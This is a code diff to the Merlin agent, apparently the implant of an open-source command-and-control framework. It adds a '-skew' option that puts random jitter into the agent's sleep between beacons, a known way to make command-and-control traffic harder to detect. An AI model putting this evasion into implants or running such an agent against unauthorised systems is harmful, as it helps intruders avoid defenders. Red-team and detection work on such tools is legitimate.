@@ -34,9 +34,10 @@ import (
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
-
+	
 	"github.com/ne0nd0g/merlin/pkg/agent"
 	"github.com/ne0nd0g/merlin/pkg/messages"
+	
 )
 
 // GLOBAL VARIABLES
@@ -47,6 +48,7 @@ var mRun = true
 var hostUUID = uuid.NewV4()
 var url = "https://127.0.0.1:443/"
 var h2Client = getH2WebClient()
+var waitSkew int64 = 30000
 var waitTime = 30000 * time.Millisecond
 var agentShell = ""
 var paddingMax = 4096
@@ -70,9 +72,12 @@ func main() {
 	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
 	flag.BoolVar(&debug, "debug", false, "Enable debug output")
 	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
+	flag.Int64Var(&waitSkew, "skew", 3000, "Variable time skew for agent to sleep")
 	flag.DurationVar(&waitTime, "sleep", 30000*time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
+
+	rand.Seed(time.Now().UTC().UnixNano())
 
 	if verbose {
 		color.Yellow("[-]Agent version: %s", version)
@@ -94,10 +99,12 @@ func main() {
 		if failedCheckin >= maxRetry {
 			os.Exit(1)
 		}
+		timeSkew := time.Duration(rand.Int63n(waitSkew)) * time.Millisecond
+		totalWaitTime := waitTime + timeSkew
 		if verbose {
-			color.Yellow("[-]Sleeping for %s at %s", waitTime.String(), time.Now())
+			color.Yellow("[-]Sleeping for %s at %s", totalWaitTime.String(), time.Now())
 		}
-		time.Sleep(waitTime)
+		time.Sleep(totalWaitTime)
 	}
 }
 
